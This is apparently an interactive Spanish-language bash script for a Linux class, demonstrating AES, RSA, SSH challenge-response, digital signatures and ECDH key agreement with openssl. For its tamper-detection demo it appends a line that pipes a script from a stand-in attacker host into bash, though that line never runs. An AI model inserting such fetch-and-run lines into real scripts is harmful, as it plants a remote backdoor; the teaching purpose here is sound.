#!/usr/bin/env bash
# ==============================================================================
# DEMOSTRACIÓN INTERACTIVA: Fundamentos de Criptografía, Llaves y Certificados
# Basado en: linux/administrator/cifrado/fundamentos_criptografia_llaves_certificados.md
#
# Diseñado para clases en vivo:
#  - Desmitifica el concepto de "llaves" (keys) en SSH, AWS EC2, OpenVPN, LUKS, GPG y HTTPS.
#  - Contrasta Criptografía Simétrica vs Asimétrica con código ejecutable.
#  - Demuestra en vivo el protocolo Challenge-Response (por qué la clave privada NUNCA viaja).
#  - Demuestra Firmas Digitales y detección instantánea de manipulación (Tamper Detection).
#  - Demuestra el acuerdo de claves de Criptografía Híbrida (Diffie-Hellman / ECDH en TLS).
#  - Pausas interactivas con [ENTER] o modo desatendido con --auto <segundos>.
#  - Limpieza automática garantizada de archivos y llaves temporales con trap.
#
# Uso:
#   ./demo_criptografia_llaves.sh          -> Modo interactivo (pausa con [ENTER])
#   ./demo_criptografia_llaves.sh --auto 3 -> Modo automático (espera 3s por paso)
# ==============================================================================

set -uo pipefail

AUTO_WAIT=0
if [[ "${1:-}" == "--auto" && -n "${2:-}" ]]; then
    AUTO_WAIT="$2"
fi

# Colores ANSI
C_RESET="\033[0m"
C_BOLD="\033[1m"
C_DIM="\033[2m"
C_GREEN="\033[0;32m"
C_CYAN="\033[0;36m"
C_YELLOW="\033[1;33m"
C_MAGENTA="\033[1;35m"
C_RED="\033[0;31m"
C_BLUE="\033[1;34m"

# Directorio temporal de trabajo
WORKDIR=$(mktemp -d /tmp/demo_crypto_XXXXXX)

cleanup() {
    echo -e "\n${C_YELLOW}🧹 [LIMPIEZA] Eliminando claves temporales y archivos de demostración...${C_RESET}"
    if [ -d "$WORKDIR" ]; then
        rm -rf "$WORKDIR"
    fi
    echo -e "${C_GREEN}✔ Entorno limpio. Ninguna clave quedó expuesta en disco.${C_RESET}\n"
}
trap cleanup EXIT INT TERM

# Configuración amigable para TMUX
if [ -n "${TMUX:-}" ]; then
    tmux set -g mouse on 2>/dev/null || true
    echo -e "${C_CYAN}======================================================================${C_RESET}"
    echo -e "${C_BOLD}${C_GREEN}✔ Sesión de TMUX detectada:${C_RESET}"
    echo -e "  - ${C_YELLOW}Scroll con MOUSE activado:${C_RESET} Podés usar la rueda del ratón directamente."
    echo -e "  - ${C_YELLOW}Scroll con TECLADO:${C_RESET} Presioná ${C_BOLD}Ctrl+b${C_RESET} y luego ${C_BOLD}[${C_RESET} (salís con ${C_BOLD}q${C_RESET})."
    echo -e "${C_CYAN}======================================================================${C_RESET}\n"
fi

step_banner() {
    local num="$1"
    local title="$2"
    echo -e "\n${C_MAGENTA}╔════════════════════════════════════════════════════════════════════════════════════╗${C_RESET}"
    echo -e "${C_MAGENTA}║${C_RESET} ${C_BOLD}${C_YELLOW}PASO ${num}: ${title}${C_RESET}"
    echo -e "${C_MAGENTA}╚════════════════════════════════════════════════════════════════════════════════════╝${C_RESET}"
}

explain() {
    echo -e "${C_CYAN}💡 EXPLICACIÓN TEÓRICA:${C_RESET} $1"
}

pie_clase() {
    local pregunta="$1"
    local respuesta="${2:-}"
    
    echo -e "\n${C_BOLD}${C_YELLOW}❓ Pregunta para la clase: ${pregunta}${C_RESET}"
    if [ -n "$respuesta" ]; then
        if [ "${AUTO_WAIT:-0}" -gt 0 ]; then
            sleep 1
        else
            echo -en "${C_DIM:-\033[2m}   [Presioná ENTER para revelar la respuesta...]${C_RESET} "
            read -r </dev/tty 2>/dev/null || read -r
        fi
        echo -e "   ${C_BOLD}${C_CYAN}✔ Respuesta esperada:${C_RESET} ${respuesta}\n"
    fi
}

pause_step() {
    local msg="${1:-Presioná [ENTER] para continuar al siguiente paso...}"
    if [ "$AUTO_WAIT" -gt 0 ]; then
        echo -e "\n${C_YELLOW}⏳ Esperando ${AUTO_WAIT}s (modo automático)...${C_RESET}"
        sleep "$AUTO_WAIT"
    else
        echo -e "\n${C_BOLD}${C_GREEN}▶ ${msg}${C_RESET}"
        read -r </dev/tty 2>/dev/null || read -r
    fi
}

run_and_show() {
    local cmd="$1"
    echo -e "\n${C_BOLD}${C_BLUE}┌─── COMANDO A EJECUTAR ────────────────────────────────────────────────────────────┐${C_RESET}"
    echo -e "${C_BOLD}${C_GREEN}$ ${cmd}${C_RESET}"
    echo -e "${C_BOLD}${C_BLUE}├─── SALIDA REAL DEL SISTEMA ───────────────────────────────────────────────────────┤${C_RESET}"
    
    local output
    output=$(eval "$cmd" 2>&1) || true
    if [ -z "$output" ]; then
        echo -e "${C_DIM}(Comando ejecutado con éxito sin salida por stdout)${C_RESET}"
    else
        echo -e "${output}"
    fi
    echo -e "${C_BOLD}${C_BLUE}└───────────────────────────────────────────────────────────────────────────────────┘${C_RESET}"
}

cd "$WORKDIR"

clear 2>/dev/null || true
echo -e "${C_CYAN}╔════════════════════════════════════════════════════════════════════════════════════╗${C_RESET}"
echo -e "${C_CYAN}║${C_RESET} ${C_BOLD}TALLER INTERACTIVO: EL ENIGMA DE LAS 'KEYS' EN LINUX Y REDES${C_RESET}                     ${C_CYAN}║${C_RESET}"
echo -e "${C_CYAN}║${C_RESET} Simétrica vs Asimétrica, Autenticación vs Cifrado, SSH, AWS EC2, OpenVPN y LUKS   ${C_CYAN}║${C_RESET}"
echo -e "${C_CYAN}╚════════════════════════════════════════════════════════════════════════════════════╝${C_RESET}"
echo -e "${C_DIM}Directorio de trabajo aislado: ${WORKDIR}${C_RESET}\n"

pause_step "Comenzar con el Paso 1: Cifrado Simétrico Clásico (AES-256)"

# ==============================================================================
# PASO 1: Cifrado Simétrico Puro con AES-256
# ==============================================================================
step_banner "1" "Cifrado Simétrico Clásico con AES-256 (La Caja Fuerte con una Única Llave)"
explain "En la criptografía simétrica existe UNA SOLA llave compartida. La misma clave que cifra es la que descifra. Es el mecanismo utilizado en LUKS2 (Master Key), gocryptfs y el túnel de datos de OpenVPN y HTTPS."

echo -e "\n1. Creando un documento confidencial de prueba:"
cat << 'EOF' > "$WORKDIR/balance_contable.txt"
DATOS CONFIDENCIALES DE PRODUCCIÓN 2026:
- Servidores Web: 12 nodos
- Clave de API Stripe: sk_live_998877665544332211
- Presupuesto mensual: $45,000 USD
EOF
run_and_show "cat $WORKDIR/balance_contable.txt"

echo -e "\n2. Cifrando el archivo con AES-256-CBC usando la clave compartida 'ClaseLinux2026!':"
run_and_show "openssl enc -aes-256-cbc -pbkdf2 -salt -in $WORKDIR/balance_contable.txt -out $WORKDIR/balance_cifrado.enc -k 'ClaseLinux2026!'"

echo -e "\n3. Inspeccionando los bytes físicos del archivo cifrado:"
run_and_show "hexdump -C $WORKDIR/balance_cifrado.enc | head -n 5"

echo -e "\n4. Descifrando el archivo con la MISMA clave secreta:"
run_and_show "openssl enc -d -aes-256-cbc -pbkdf2 -in $WORKDIR/balance_cifrado.enc -out $WORKDIR/balance_recuperado.txt -k 'ClaseLinux2026!' && cat $WORKDIR/balance_recuperado.txt"

echo -e "\n5. Efecto Avalancha: ¿Qué ocurre si un atacante altera un solo byte del archivo cifrado?"
printf '\xFF' | dd of="$WORKDIR/balance_corrupto.enc" conv=notrunc bs=1 count=1 seek=24 2>/dev/null
run_and_show "openssl enc -d -aes-256-cbc -pbkdf2 -in $WORKDIR/balance_corrupto.enc -out $WORKDIR/descifrado_fallido.txt -k 'ClaseLinux2026!' 2>&1 || true"
echo -e "${C_RED}✖ Fallo catastrófico:${C_RESET} El padding o bloque quedó destruido. La matemática simétrica no tolera manipulación."

pie_clase "¿Cuál es el talón de Aquiles del cifrado simétrico si quiero enviar este balance a un auditor en Londres?" \
          "El 'Key Distribution Problem'. Para que el auditor lo lea, debo enviarle la contraseña 'ClaseLinux2026!'. Si se la mando por email, WhatsApp o Slack, cualquier intermediario que intercepte la clave podrá descifrar el balance."

pause_step "Continuar al Paso 2: Criptografía Asimétrica (Par de Claves Pública y Privada)"

# ==============================================================================
# PASO 2: Criptografía Asimétrica (El Buzón y el Candado Público)
# ==============================================================================
step_banner "2" "Criptografía Asimétrica (El Par de Claves: Pública para Cifrar, Privada para Descifrar)"
explain "La criptografía asimétrica resuelve el problema de la distribución de claves: genera un PAR matemático. La Clave Pública se entrega a todo el mundo (como la ranura de un buzón). La Clave Privada NUNCA abandona tu computadora."

echo -e "\n1. Generando un par de claves asimétricas RSA de 2048 bits:"
run_and_show "openssl genpkey -algorithm RSA -out $WORKDIR/clave_privada.pem -pkeyopt rsa_keygen_bits:2048 2>/dev/null && chmod 600 $WORKDIR/clave_privada.pem"

echo -e "\n2. Extrayendo la Clave Pública asociada (la que podemos regalar al mundo):"
run_and_show "openssl rsa -pubout -in $WORKDIR/clave_privada.pem -out $WORKDIR/clave_publica.pem 2>/dev/null && head -n 4 $WORKDIR/clave_publica.pem"

echo -e "\n3. Un remitente externo toma la Clave Pública y cifra un mensaje para nosotros:"
echo "MENSAJE_SECRETO: El servidor de base de datos se reiniciará a las 03:00 AM." > "$WORKDIR/mensaje_auditor.txt"
run_and_show "openssl pkeyutl -encrypt -pubin -inkey $WORKDIR/clave_publica.pem -in $WORKDIR/mensaje_auditor.txt -out $WORKDIR/mensaje_auditor.enc"

echo -e "\n4. ¿Puede el remitente descifrar el mensaje con la misma Clave Pública que usó para cifrar?"
run_and_show "openssl pkeyutl -decrypt -pubin -inkey $WORKDIR/clave_publica.pem -in $WORKDIR/mensaje_auditor.enc 2>&1 || true"
echo -e "${C_GREEN}✔ Demostración matemática:${C_RESET} La clave pública SOLO cifra. Es unidireccional."

echo -e "\n5. Solo el dueño de la Clave Privada puede abrir y leer el mensaje:"
run_and_show "openssl pkeyutl -decrypt -inkey $WORKDIR/clave_privada.pem -in $WORKDIR/mensaje_auditor.enc"

pie_clase "Si la criptografía asimétrica es tan segura y no exige compartir secretos, ¿por qué no la usamos para transmitir videos o transferir discos rígidos completos?" \
          "Porque es computacionalmente entre 1.000 y 10.000 veces más lenta que AES. Si cifráramos un archivo de 2 GB con RSA, la CPU se saturaría durante horas."

pause_step "Continuar al Paso 3: Challenge-Response en Vivo (SSH y AWS EC2 por Dentro)"

# ==============================================================================
# PASO 3: Challenge-Response en SSH y AWS EC2
# ==============================================================================
step_banner "3" "El Mecanismo Challenge-Response: Cómo Funciona SSH y AWS EC2 por Dentro"
explain "Mito común: 'Cuando hago ssh -i clave.pem, mi clave privada viaja al servidor'. ¡FALSO! Si viajara, cualquiera con Wireshark podría robarla. SSH usa Autenticación por Reto-Respuesta (Challenge-Response)."

echo -e "\n1. Generando un par de claves SSH moderno (Ed25519) para el alumno:"
run_and_show "ssh-keygen -t ed25519 -N '' -f $WORKDIR/id_ed25519 -C 'alumno@capacitacion.linux' >/dev/null && ls -l $WORKDIR/id_ed25519*"

echo -e "\n2. Simulando el Servidor SSH: Instalamos la Clave Pública en authorized_keys:"
run_and_show "cat $WORKDIR/id_ed25519.pub"
echo -e "${C_DIM}El servidor solo conoce la clave pública.${C_RESET}"

echo -e "\n3. El Servidor SSH genera un 'RETO' (Challenge/Nonce) aleatorio impredecible:"
run_and_show "openssl rand -hex 32 > $WORKDIR/reto_servidor.txt && cat $WORKDIR/reto_servidor.txt"

echo -e "\n4. El Cliente SSH toma el reto y lo FIRMA usando su Clave Privada (sin enviarla jamás):"
# Usamos un par RSA auxiliar para simular la firma estándar con openssl dgst
run_and_show "openssl dgst -sha256 -sign $WORKDIR/clave_privada.pem -out $WORKDIR/firma_reto.bin $WORKDIR/reto_servidor.txt && ls -lh $WORKDIR/firma_reto.bin"

echo -e "\n5. El Servidor SSH valida la firma usando ÚNICAMENTE la Clave Pública del cliente:"
run_and_show "openssl dgst -sha256 -verify $WORKDIR/clave_publica.pem -signature $WORKDIR/firma_reto.bin $WORKDIR/reto_servidor.txt"
echo -e "${C_GREEN}✔ AUTENTICACIÓN EXITOSA:${C_RESET} El servidor verificó la identidad del cliente sin haber visto nunca la clave privada."

echo -e "\n6. ¿Qué ocurre si un impostor intenta autenticarse firmando con otra clave privada?"
openssl genpkey -algorithm RSA -out "$WORKDIR/clave_impostor.pem" -pkeyopt rsa_keygen_bits:2048 2>/dev/null
openssl dgst -sha256 -sign "$WORKDIR/clave_impostor.pem" -out "$WORKDIR/firma_falsa.bin" "$WORKDIR/reto_servidor.txt"
run_and_show "openssl dgst -sha256 -verify $WORKDIR/clave_publica.pem -signature $WORKDIR/firma_falsa.bin $WORKDIR/reto_servidor.txt 2>&1 || true"
echo -e "${C_RED}✖ ACCESO DENEGADO (Permission Denied):${C_RESET} La firma no coincide con la clave pública autorizada."

pie_clase "¿Qué es exactamente el archivo .pem que te entrega AWS al crear una instancia EC2?" \
          "Es la clave privada de un par SSH. AWS inyecta automáticamente la clave pública en /home/ubuntu/.ssh/authorized_keys mediante cloud-init y destruye su copia de la clave privada."

pause_step "Continuar al Paso 4: Integridad y Firmas Digitales (GPG, Repositorios APT y Git)"

# ==============================================================================
# PASO 4: Firmas Digitales y Detección de Adulteración (Integridad y No Repudio)
# ==============================================================================
step_banner "4" "Firmas Digitales e Integridad: Cómo GPG y APT Protegen el Software de Producción"
explain "La firma digital garantiza dos cosas: INTEGRIDAD (nadie alteró un solo bit del archivo) y NO REPUDIO (solo el autor que posee la clave privada pudo haberlo firmado)."

echo -e "\n1. Creando un script crítico de despliegue en producción:"
cat << 'EOF' > "$WORKDIR/despliegue_produccion.sh"
#!/bin/bash
# Script oficial del equipo de SRE
echo "Iniciando despliegue de version 2.4.0 en cluster..."
systemctl restart nginx
EOF
run_and_show "cat $WORKDIR/despliegue_produccion.sh"

echo -e "\n2. El autor calcula el digest SHA-256 y lo firma con su Clave Privada:"
run_and_show "openssl dgst -sha256 -sign $WORKDIR/clave_privada.pem -out $WORKDIR/despliegue.sig $WORKDIR/despliegue_produccion.sh && ls -lh $WORKDIR/despliegue.sig"

echo -e "\n3. El servidor de producción verifica la autenticidad antes de ejecutar:"
run_and_show "openssl dgst -sha256 -verify $WORKDIR/clave_publica.pem -signature $WORKDIR/despliegue.sig $WORKDIR/despliegue_produccion.sh"
echo -e "${C_GREEN}✔ FIRMA VÁLIDA:${C_RESET} El script proviene legítimamente del autor autorizado."

echo -e "\n4. Ataque Man-in-the-Middle: Un atacante altera una línea del script para inyectar código malicioso:"
echo 'curl -s http://hacker.evil/backdoor.sh | bash' >> "$WORKDIR/despliegue_produccion.sh"
run_and_show "tail -n 2 $WORKDIR/despliegue_produccion.sh"

echo -e "\n5. El sistema vuelve a verificar la firma del archivo adulterado:"
run_and_show "openssl dgst -sha256 -verify $WORKDIR/clave_publica.pem -signature $WORKDIR/despliegue.sig $WORKDIR/despliegue_produccion.sh 2>&1 || true"
echo -e "${C_RED}🚨 ALERTA DE SEGURIDAD:${C_RESET} La verificación falló. El kernel o el gestor de paquetes (APT) aborta la ejecución."

pie_clase "¿Por qué cuando agregamos un PPA o repositorio externo en Ubuntu debemos ejecutar 'curl ... | gpg --dearmor | tee /etc/apt/keyrings/... '?" \
          "Porque descargamos la Clave Pública del desarrollador para que 'apt update' verifique las firmas de cada paquete .deb descargado y evite que nos instalen software troyanizado."

pause_step "Continuar al Paso 5: Criptografía Híbrida (El Secreto de HTTPS, TLS y OpenVPN)"

# ==============================================================================
# PASO 5: Criptografía Híbrida (Diffie-Hellman / ECDH en Acción)
# ==============================================================================
step_banner "5" "Criptografía Híbrida en Acción (El Acuerdo Secreto de Claves en TLS y OpenVPN)"
explain "¿Cómo se combinan ambos mundos? En el apretón de manos (Handshake), se usa criptografía asimétrica efímera (ECDH) para acordar una clave simétrica temporal sin enviarla por la red. Luego, el tráfico masivo viaja con AES-GCM a velocidad nativa."

echo -e "\n1. Generando parámetros de curva elíptica efímeros para el Cliente y el Servidor:"
openssl genpkey -algorithm EC -pkeyopt ec_paramgen_curve:P-256 -out "$WORKDIR/cliente_ec.pem" 2>/dev/null
openssl genpkey -algorithm EC -pkeyopt ec_paramgen_curve:P-256 -out "$WORKDIR/servidor_ec.pem" 2>/dev/null
openssl ec -pubout -in "$WORKDIR/cliente_ec.pem" -out "$WORKDIR/cliente_pub.pem" 2>/dev/null
openssl ec -pubout -in "$WORKDIR/servidor_ec.pem" -out "$WORKDIR/servidor_pub.pem" 2>/dev/null

echo -e "  - ${C_CYAN}Cliente genera Clave Pública efímera:${C_RESET} $(cut -c 1-35 "$WORKDIR/cliente_pub.pem" | head -n 2 | tr -d '\n')..."
echo -e "  - ${C_MAGENTA}Servidor genera Clave Pública efímera:${C_RESET} $(cut -c 1-35 "$WORKDIR/servidor_pub.pem" | head -n 2 | tr -d '\n')..."

echo -e "\n2. Ambas partes intercambian ÚNICAMENTE sus claves públicas por el cable:"
echo -e "${C_DIM}(Cualquier espía que escuche la red verá las claves públicas, pero NO las privadas)${C_RESET}"

echo -e "\n3. Magia matemática de Diffie-Hellman: Cada parte deriva la MISMA clave simétrica secreta:"
run_and_show "openssl pkeyutl -derive -inkey $WORKDIR/cliente_ec.pem -peerkey $WORKDIR/servidor_pub.pem -out $WORKDIR/secreto_cliente.bin"
run_and_show "openssl pkeyutl -derive -inkey $WORKDIR/servidor_ec.pem -peerkey $WORKDIR/cliente_pub.pem -out $WORKDIR/secreto_servidor.bin"

echo -e "\n4. Comprobando si ambos extremos obtuvieron exactamente la misma Clave de Sesión:"
run_and_show "sha256sum $WORKDIR/secreto_cliente.bin $WORKDIR/secreto_servidor.bin"
echo -e "${C_GREEN}✔ COINCIDENCIA EXACTA (100%):${C_RESET} Ambos calcularon la misma clave de 256 bits sin enviarla jamás."

echo -e "\n5. A partir de este instante, todo el tráfico viaja cifrado con AES usando esta Session Key."
echo -e "Al cerrar la sesión, las claves efímeras se destruyen (**Perfect Forward Secrecy**)."

pie_clase "¿Qué significa 'Perfect Forward Secrecy' (PFS) en HTTPS y OpenVPN?" \
          "Que si un atacante graba todo tu tráfico cifrado hoy y dentro de 5 años roba la clave privada del servidor, NO podrá descifrar las grabaciones pasadas porque cada sesión usó claves efímeras que ya fueron borradas de la memoria RAM."

pause_step "Continuar al Paso 6: Matriz Comparativa Definitiva"

# ==============================================================================
# PASO 6: Matriz Comparativa y Resumen de Cierre
# ==============================================================================
step_banner "6" "Matriz Recapitulativa: Las 'Keys' de la Infraestructura en Linux"

cat << 'EOF'
┌───────────────────────┬─────────────────────┬───────────────────────────┬────────────────────────────────────────┐
│ TECNOLOGÍA            │ TIPO CRIPTOGRÁFICO  │ ¿QUÉ HACE LA LLAVE?       │ ¿DÓNDE VIVE FÍSICAMENTE?               │
├───────────────────────┼─────────────────────┼───────────────────────────┼────────────────────────────────────────┤
│ SSH (id_ed25519)      │ Asimétrica (Par)    │ Autenticación (Identidad) │ Privada en ~/.ssh/, Pública en server  │
│ AWS EC2 (.pem)        │ Asimétrica (Par)    │ Autenticación SSH         │ Privada en tu PC, Pública en AWS       │
│ HTTPS / TLS           │ Híbrida (Asim+Sim)  │ Autenticación + Cifrado   │ Privada en server, Certificado público │
│ OpenVPN (Mutual TLS)  │ Asimétrica Mutua    │ Autenticación Cliente/Srv │ client.key en PC, server.key en VPN    │
│ OpenVPN (Static Key)  │ Simétrica (PSK)     │ Autenticación + Cifrado   │ Archivo .key idéntico en ambos nodos   │
│ LUKS2 (dm-crypt)      │ Simétrica pura      │ Cifrado en Reposo (Disco) │ Master Key en RAM, Keyslots en header  │
│ gocryptfs (FUSE)      │ Simétrica pura      │ Cifrado en Reposo (Files) │ Master Key en RAM, gocryptfs.conf      │
│ GPG / PGP             │ Asimétrica          │ Cifrado Y Firmas (APT)    │ Anillo ~/.gnupg/, /etc/apt/keyrings/   │
│ WireGuard             │ Asimétrica (Noise)  │ Identidad + Cifrado       │ /etc/wireguard/wg0.conf (Curve25519)   │
│ API Keys / Tokens     │ Secreto Compartido  │ Autorización Aplicación   │ Headers HTTP (requiere HTTPS abajo)    │
└───────────────────────┴─────────────────────┴───────────────────────────┴────────────────────────────────────────┘
EOF

echo -e "\n${C_BOLD}${C_GREEN}✔ Demostración completada con éxito.${C_RESET}"
echo -e "${C_CYAN}Podés consultar la guía conceptual completa en:${C_RESET} ${C_BOLD}linux/administrator/cifrado/fundamentos_criptografia_llaves_certificados.md${C_RESET}\n"
